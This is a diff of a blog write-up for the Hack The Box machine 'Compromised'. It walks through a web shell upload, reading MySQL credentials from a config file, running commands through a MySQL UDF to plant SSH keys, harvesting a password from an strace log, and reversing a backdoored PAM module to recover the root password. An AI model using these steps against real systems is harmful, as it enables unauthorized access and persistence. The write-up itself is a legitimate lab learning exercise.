@@ -2,9 +2,12 @@
 title: Compromised Machine - Writeup 
 author: Software User 
 date: 2021-02-04 16:31:00 +0800
+category: hackthebox 
+tags: [htb-machines, htb, compromised]
+
 --- 
 
-![Desktop View]({{ "assets/img/htb-machines/compromised/1.png" | relative_url }})
+![Desktop View]({{ "/assets/img/htb-machines/compromised//1.png" | relative_url }})
 
 ---
 
@@ -32,13 +35,14 @@ As always, I added IP In hosts file.
 
 ![Desktop View]({{ "/assets/img/htb-machines/compromised/2.png" | relative_url }})
 
--sC for default scripts
--sV for Version detection
--sS for SYN scan 
--T4 for speeding up Scan
--A  for Advanced and Aggressive features 
--oN for Output
+<strong>-sC for default scripts</strong><br>
+<strong>-sV for Version detection</strong><br>
+<strong>-sS for SYN scan </strong><br>
+<strong>-T4 for speeding up Scan</strong><br>
+<strong>-A  for Advanced and Aggressive features</strong><br> 
+<strong>-oN for Output</strong><br>
 
+lnmap is just my alias to print only open ports from result file
 ```
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
@@ -53,7 +57,7 @@ Litecart is running on web page. LiteCart e-commerce platform built with PHP, jQ
 
 ![Desktop View]({{ "/assets/img/htb-machines/compromised/main.png"}})
 
-Nothing intresting lets dir brute.
+<p>Nothing intresting lets dir brute.</p>
 
 <p><code class="language-plaintext highlighter-rouge">gobuster dir -u compromised.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 | tee gobuster/gobuster.log </code></p>
 
@@ -445,6 +449,153 @@ else:
 
 ```
 
+---
+
 Let's run the exploit again 
 
-![Desktop View]({{ "/assets/img/htb-machines/compromised/png.11"}})
+![Desktop View]({{ "/assets/img/htb-machines/compromised/11.png" | relative_url }})
+
+our shell is uploaded successfully
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/12.png" | relative_url }})
+
+now we can execute commands on webserver as we have bypassed disablefunctions.
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/13.png" | relative_url }})
+
+after enumerating through shell i found mysql creds.
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/14.png" | relative_url }})
+
+```
+cat /var/www/html/shop/includes/config.inc.php
+
+DB_TYPE', 'mysql');
+  define('DB_SERVER', 'localhost');
+  define('DB_USERNAME', 'root');
+  define('DB_PASSWORD', 'changethis');
+
+```
+also mysql has a shell 
+
+```
+mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
+```
+
+I have done something similar before this box so UDF(User Defined Functions ) can be used here [udf](https://mariadb.com/kb/en/mysqlfunc-table/)
+
+``
+mysql -u root -pchangethis -e "select * from mysql.func;" 
+``
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/15.png" | relative_url }})
+
+exec_cmd is a UDF yeah so now we can execute commands 
+
+as ssh is opened in box so we can put our ssh keys in mysql authorized keys!!
+
+```
+mysql -u root -pchangethis -e "select exec_cmd('mkdir -p /var/lib/mysql/.ssh')" 
+mysql -u root -pchangethis -e "select exec_cmd('echo your keys > /var/lib/mysql/.ssh/authorized_keys')"
+```
+
+also give ``chmod 600`` to your ssh key.
+600 mean that the owner has full read and write access to the file, while no other user can access the file
+successfully logged in through ssh as mysql 
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/16.png" | relative_url }})
+
+we have lot of files in myqsl home but strace-log.dat is intresting one. strace-log.dat is big we can try to grep random strings. we got password of sysadmin also sysadmin has shell. 
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/17.png"  | relative_url }})
+
+``
+:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0`
+``
+<br>
+``
+sysadmin: 3*NLJE32I$Fe
+``
+
+ssh on sysadmin 
+we got user
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/18.png"}})
+
+<strong><span style="color:#ff5555">Root</span></strong>
+
+--- 
+i was stucked in root part so i got a hint from 
+
+he told me to use the
+
+```
+find / -newermt "2020-07-14" ! -newermt "2020-09-16" -type f 2>/dev/null 
+```
+so i found many files but these two files are intresting and these both file have same name but one is hidden and another is not.
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/main5.png"}})
+
+i googled about unix pam so pam is pluggable authentication module (PAM) is a mechanism to integrate multiple low-level authentication schemes into a high-level application programming interface (API). Read More about [PAM](https://en.wikipedia.org/wiki/Pluggable_authentication_module)
+while googling about more about i found a article on [pam backdoor](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html) this is just a article on creating  a backdoor pam. also from here i guessed that we need to reverse .so file  
+<br>
+now we need to reverse that  so first transfer pam_unix.so in your system
+<br>
+scp 
+```
+scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
+```
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/19.png" | relative_url }})
+
+i always use ghidra for reversing stuff
+
+lets open it in ghidra
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/20.png" | relative_url }})
+
+/assets/img/htb-machines/compromised/
+
+````
+
+if (iVar2 == 0) {
+  backdoor._0_8_ = 0x4533557e656b6c7a;
+  backdoor._8_7_ = 0x2d326d3238766e;
+  local_40 = 0;
+  iVar2 = strcmp((char *)p,backdoor);
+  if (iVar2 != 0) {
+  iVar2 = _unix_verify_password(pamh,name,(char *)p,ctrl);
+ }
+````
+thats hex string
+
+we can reverse the strings using option in ghidra.
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/21.png" | relative_url }})
+
+convert both string into char sequence 
+
+so strings will be 
+
+```
+"zlke~U3E"
+"nv82m2-\x00"
+
+```
+<br>
+
+our password will be -:
+
+```
+zlke~U3Env82m2-
+```
+<br>
+lets try this password for root
+
+![Desktop View]({{ "/assets/img/htb-machines/compromised/22.png"}})
+
+this box was really good learned a lot.
+
+ps -: Ignore my screenshots; both are from different machines. I couldn't recover much data, so I solved this box two times. if you have any query message me on my [Twitter](https://twitter.com/softwareuser_).
+
+--- 
